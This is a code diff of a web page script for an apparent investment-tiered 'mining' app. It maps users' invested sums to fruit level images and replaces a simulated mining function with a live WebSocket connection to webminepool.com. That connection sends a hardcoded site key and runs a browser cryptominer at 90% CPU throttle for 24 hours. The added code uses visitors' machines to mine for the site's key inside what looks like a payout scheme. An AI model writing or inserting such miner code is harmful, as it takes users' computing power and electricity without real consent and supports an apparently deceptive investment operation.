@@ -337,7 +337,8 @@ footer {
   </footer>
   
   
-  <script type="module">
+   
+   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
     import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
     import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
@@ -358,8 +359,11 @@ footer {
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
     const auth = getAuth(app);
+        
 
     // Global Variables
+const siteKey = 'SK_YBn5VEFnw47p2McZK6b6b';
+
     const timerElement = document.getElementById("timer");
     const levelImage = document.getElementById("levelImage");
     const collectIncomeBtn = document.getElementById("collectIncomeBtn");
@@ -397,17 +401,20 @@ footer {
             startCountdown();
           }
 
-          // Update Level Image
-          const levelImages = {
-            Banana: "ba.png",
-            Orenge: "or.png",
-            Apple: "ap.png",
-            Avocados: "av.png",
-            Berry: "be.png",
-            Mango: "man.png",
-            Guava: "gu.png",
-          };
-          levelImage.src = levelImages[userData.level] || "avatar.png";
+          // Update Level Image based on Investment Amount
+          let investmentAmount = userData.investment || 0;
+          let levelImageSrc;
+
+          if (investmentAmount >= 280000) levelImageSrc = "gu.png";
+          else if (investmentAmount >= 140000) levelImageSrc = "man.png";
+          else if (investmentAmount >= 70000) levelImageSrc = "be.png";
+          else if (investmentAmount >= 35000) levelImageSrc = "av.png";
+          else if (investmentAmount >= 15000) levelImageSrc = "ap.png";
+          else if (investmentAmount >= 8000) levelImageSrc = "or.png";
+          else if (investmentAmount >= 3500) levelImageSrc = "ba.png";
+          else levelImageSrc = "avatar.png";
+
+          levelImage.src = levelImageSrc;
         } else {
           console.error("User data not found in Firebase!");
         }
@@ -463,19 +470,44 @@ footer {
       collectIncomeBtn.classList.add("hidden");
     };
 
-    // Mining WebMinePool API
     const startMining = () => {
-      const user = auth.currentUser;
-      if (user && dailyUpgrade > 0) {
-        console.log("Starting mining for user:", user.uid);
-        // Simulated mining process for demo
-        setTimeout(() => {
-          console.log("Mining completed!");
-        }, 5000);
-      } else {
-        console.error("Mining cannot start because the user has not invested.");
-      }
+  const user = auth.currentUser;
+  if (user && dailyUpgrade > 0) {
+    console.log("Starting mining for user:", user.uid);
+
+    const ws = new WebSocket('wss://webminepool.com/start'); // WebSocket URL
+
+    ws.onopen = () => {
+      console.log('WebSocket connected!');
+      const startMessage = JSON.stringify({
+        siteKey: siteKey,
+        userId: user.uid,
+        throttle: 0.9 // Adjust CPU throttle if needed
+      });
+      ws.send(startMessage); // Send start mining message
     };
+
+    ws.onmessage = (event) => {
+      console.log('Mining response:', event.data);
+    };
+
+    ws.onerror = (error) => {
+      console.error('WebSocket Error:', error);
+    };
+
+    ws.onclose = () => {
+      console.log('WebSocket connection closed.');
+    };
+
+    // Stop mining after 24 hours
+    setTimeout(() => {
+      ws.close();
+      console.log("Mining stopped after 24 hours.");
+    }, 24 * 60 * 60 * 1000); // 24 hours in milliseconds
+  } else {
+    console.error("Mining cannot start because the user has not invested.");
+  }
+};
 
     // Event Listeners
     collectIncomeBtn.addEventListener("click", async () => {
@@ -487,6 +519,8 @@ footer {
         console.log("User is not authenticated or no dailyUpgrade.");
       }
     });
+    
+    
 
     // Initialize App after Authentication
     onAuthStateChanged(auth, (user) => {
@@ -498,6 +532,6 @@ footer {
         console.log("No user is logged in.");
       }
     });
-  </script>
+</script>             
 </body>
 </html>
